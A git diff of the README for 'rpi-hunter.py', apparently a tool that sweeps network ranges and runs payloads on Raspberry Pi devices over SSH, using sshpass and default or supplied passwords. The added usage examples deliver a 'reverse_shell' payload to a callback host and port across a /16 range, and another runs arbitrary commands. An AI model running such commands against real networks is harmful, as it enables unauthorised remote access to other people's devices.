@@ -35,10 +35,14 @@ optional arguments:
   --safe             Print sshpass command, but don't execute it
   -q                 Don't print banner
 ```
-* Example usage: `./rpi-hunter.py -r 192.168.0.0/16 --payload reverse_shell -H 127.0.0.1 -P 1337` 
+
 * Run `./rpi-hunter.py --list` to see avalible payloads.
 * Payloads can be specified by the payload name from `--list` or as raw input
     * ex. `--payload reverse_shell` or `--payload [your cli command here]`
+
+* Example usage: 
+	* `./rpi-hunter.py -r 192.168.0.0/16 --payload reverse_shell -H 127.0.0.1 -P 1337`
+	* `./rpi-hunter.py -r 192.168.2.0/16 -c lamepassword --payload "ls -lah"
 
 ## Disclaimer
 ## The standard internet fun disclaimer applies. Don't commit crimes, be responsible.
